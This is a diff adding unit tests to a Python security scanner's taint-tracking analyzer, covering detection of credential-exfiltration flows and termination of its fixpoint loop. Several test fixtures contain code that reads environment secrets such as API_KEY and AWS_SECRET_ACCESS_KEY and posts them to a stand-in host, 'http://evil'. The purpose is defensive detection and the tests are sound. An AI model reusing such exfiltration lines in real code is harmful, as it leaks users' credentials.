@@ -18,9 +18,12 @@
 from __future__ import annotations
 
 import json
+import time
 
 from skillspector.nodes.analyzers import behavioral_taint_tracking
+from skillspector.nodes.analyzers.common import build_type_map
 from skillspector.nodes.deduplicate import deduplicate
+from skillspector.python_ast import get_python_ast
 from skillspector.state import WorkflowResourceBudget
 
 
@@ -308,6 +311,97 @@ class TestVariableMediatedFlow:
         code = 'data = open("secret.txt").read()\nf = open("exfil.txt", "w")\nf.write(data)\n'
         findings = _run(code)
         assert isinstance(findings, list)
+
+    def test_doubly_nested_source_before_shallower_sink_is_tracked(self):
+        """A source assigned two AST levels deeper than its sink must still flow.
+
+        The analyzer walks the module once, recording each source assignment
+        into a `tainted` dict and consulting it at sink call sites. Walking in
+        AST breadth-first order (as `ast.walk` does) visits a sink nested one
+        level shallower than its source BEFORE the source assignment, even
+        though the assignment appears earlier in the source text — the taint
+        lookup then finds nothing and a real credential-exfiltration flow is
+        silently dropped. This is the natural shape of an env var read inside
+        a guarded/nested block and exfiltrated at module level afterwards.
+        """
+        code = (
+            "import os, requests\n"
+            "if True:\n"
+            "    if True:\n"
+            '        secret = os.environ.get("API_KEY")\n'
+            'requests.post("http://evil", data=secret)\n'
+        )
+        findings = _run(code)
+        tt3 = [f for f in findings if f.rule_id == "TT3"]
+        assert len(tt3) >= 1
+
+    def test_function_defined_before_module_level_source_is_tracked(self):
+        """A sink inside a function DEFINED before its source must still flow.
+
+        The function body only runs when called, after the later assignment
+        has already executed — order in the file is not execution order.
+        """
+        code = (
+            "import os, requests\n"
+            "def send():\n"
+            "    requests.post('http://evil', data=API_KEY)\n"
+            'API_KEY = os.environ["API_KEY"]\n'
+            "send()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_helper_called_from_main_after_source_read_is_tracked(self):
+        """A sink in a helper called from main(), after main() reads the source."""
+        code = (
+            "import os, requests\n"
+            "def upload(payload):\n"
+            "    requests.post('http://evil', data=payload)\n"
+            "def main():\n"
+            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
+            "    upload(payload)\n"
+            "main()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_helper_called_under_main_guard_is_tracked(self):
+        """Same shape as above, guarded by `if __name__ == "__main__":`."""
+        code = (
+            "import os, requests\n"
+            "def upload(payload):\n"
+            "    requests.post('http://evil', data=payload)\n"
+            'if __name__ == "__main__":\n'
+            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
+            "    upload(payload)\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_method_using_module_global_assigned_later_is_tracked(self):
+        """A method reads a module global that is assigned after the class body."""
+        code = (
+            "import os, requests\n"
+            "class Uploader:\n"
+            "    def send(self):\n"
+            "        requests.post('http://evil', data=API_KEY)\n"
+            'API_KEY = os.environ["API_KEY"]\n'
+            "Uploader().send()\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_loop_carried_source_read_after_sink_in_body_is_tracked(self):
+        """A sink in a loop body, above the source read it consumes next iteration."""
+        code = (
+            "import os, requests\n"
+            "secret = None\n"
+            "for _ in range(2):\n"
+            "    requests.post('http://evil', data=secret)\n"
+            '    secret = os.environ["API_KEY"]\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
 
 
 # ── Edge cases ──────────────────────────────────────────────────────────
@@ -707,3 +801,151 @@ class TestResourceBounds:
             "runtime_limit",
             "runtime_limit",
         ]
+
+
+class _RuntimeBudgetError(RuntimeError):
+    """Raised by the test's check_runtime once a call-count cap is reached."""
+
+
+def _capped_check_runtime(max_calls: int):
+    """A check_runtime callback that raises after *max_calls* invocations.
+
+    A non-terminating or super-linear fixpoint trips the cap and fails the
+    test fast, instead of spinning to the scan-wide deadline and hanging CI.
+    """
+    state = {"calls": 0}
+
+    def check_runtime() -> None:
+        state["calls"] += 1
+        if state["calls"] > max_calls:
+            raise _RuntimeBudgetError(f"check_runtime exceeded {max_calls} calls")
+
+    return check_runtime
+
+
+def _collect(code: str, check_runtime=None) -> dict:
+    """Run `_collect_tainted` directly on *code* and return name -> source_call."""
+    parsed = get_python_ast(None, code, "t.py")
+    type_map = build_type_map(parsed.tree, parsed.import_aliases)
+    tainted = behavioral_taint_tracking._collect_tainted(
+        parsed.tree, type_map, parsed.import_aliases, check_runtime
+    )
+    return {name: tv.source_call for name, tv in tainted.items()}
+
+
+class TestFixpointTermination:
+    """The taint fixpoint must be monotone and linear, not order-dependent.
+
+    These guard the two blockers in PR #611's second review: the previous
+    "repeat every pass until values stop changing" loop could oscillate
+    forever on cyclic re-assignments and was quadratic on reverse-ordered
+    chains, letting a tiny crafted file spin the analyzer to the scan-wide
+    deadline and disable taint analysis for every later Python file.
+    """
+
+    def test_cyclic_reassignment_terminates_and_taints_all(self) -> None:
+        """The reviewer's oscillating module must converge, not spin forever.
+
+        `x = os.getenv("A"); x = y; y = os.environ["B"]; y = z; z = x` made the
+        old whole-value fixpoint swap the sources of x/y/z on every pass and
+        never exit. Add-only taint can only grow, so it must terminate well
+        inside the call cap and still taint all three names.
+        """
+        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
+        sources = _collect(code, _capped_check_runtime(2000))
+        assert set(sources) == {"x", "y", "z"}
+        # Every name traces back to one of the two credential sources.
+        assert set(sources.values()) <= {"os.getenv", "os.environ"}
+
+    def test_cyclic_reassignment_flows_to_sink(self) -> None:
+        """End to end: the oscillating module plus a sink still reports TT3."""
+        code = (
+            "import os, requests\n"
+            'x = os.getenv("A")\n'
+            "x = y\n"
+            'y = os.environ["B"]\n'
+            "y = z\n"
+            "z = x\n"
+            'requests.post("http://evil", data=z)\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_reverse_ordered_chain_is_linear(self) -> None:
+        """A reverse chain no longer needs N+1 passes over N assignments.
+
+        `a3 = a2; a2 = a1; a1 = a0; a0 = os.getenv("K")` forced the old loop
+        into one full pass per link. A monotone worklist taints each name once,
+        so a few thousand links finish well inside a linear call cap (and far
+        under a second) rather than quadratically.
+        """
+        depth = 3200
+        lines = ["import os"]
+        lines += [f"a{i} = a{i - 1}" for i in range(depth, 0, -1)]
+        lines.append('a0 = os.getenv("K")')
+        code = "\n".join(lines) + "\n"
+
+        start = time.monotonic()
+        # Linear bound: a small constant per assignment. A quadratic loop would
+        # need ~depth passes and blow past this cap immediately.
+        sources = _collect(code, _capped_check_runtime(depth * 20))
+        elapsed = time.monotonic() - start
+
+        assert len(sources) == depth + 1
+        assert all(src == "os.getenv" for src in sources.values())
+        assert elapsed < 1.0
+
+    def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
+        """Even with no runtime check at all (budget=None callers), it returns."""
+        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
+        sources = _collect(code)  # check_runtime=None
+        assert set(sources) == {"x", "y", "z"}
+
+    def test_wide_unpacking_fires_each_assignment_once(self, monkeypatch) -> None:
+        """A wide propagating assignment must fire once, not once per read name.
+
+        The reviewer's remaining blocker: `propagators` stored each propagating
+        assignment once per distinct name its value reads, so for
+
+            s0, s1, ..., sK = os.getenv("X")     # K names, seeded directly
+            t0, t1, ..., tK' = s0, s1, ..., sK    # one Assign, K' targets
+
+        draining each of the K tainted read names re-ran ``_mark_targets`` over
+        the whole K'-target list, giving K x K' work. A ``check_runtime`` call
+        cap cannot see this (the drain makes only K + 1 checks). So count
+        ``_mark_targets`` calls directly and assert each assignment fires at
+        most once: the total is bounded by the number of assignments, not by
+        names read x targets.
+        """
+        width = 2000
+        reads = ", ".join(f"s{i}" for i in range(width))
+        targets = ", ".join(f"t{i}" for i in range(width))
+        code = (
+            "import os\n"
+            f'{reads} = os.getenv("X")\n'  # direct source: taints s0..s{width-1}
+            f"{targets} = {reads}\n"  # one propagating Assign with `width` targets
+        )
+
+        # There are exactly two Assign statements; linear drain must not call
+        # _mark_targets more than once per assignment.
+        n_assignments = 2
+        calls = {"n": 0}
+        orig_mark_targets = behavioral_taint_tracking._mark_targets
+
+        def counting_mark_targets(*args, **kwargs):
+            calls["n"] += 1
+            return orig_mark_targets(*args, **kwargs)
+
+        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
+
+        start = time.monotonic()
+        sources = _collect(code, _capped_check_runtime(width * 20))
+        elapsed = time.monotonic() - start
+
+        # Fire-once: one call seeds the direct source, one fires the propagator.
+        # The quadratic shape would call _mark_targets `width` times in the drain.
+        assert calls["n"] <= n_assignments
+        # All read and target names are tainted, all tracing to os.getenv.
+        assert len(sources) == 2 * width
+        assert all(src == "os.getenv" for src in sources.values())
+        assert elapsed < 1.0
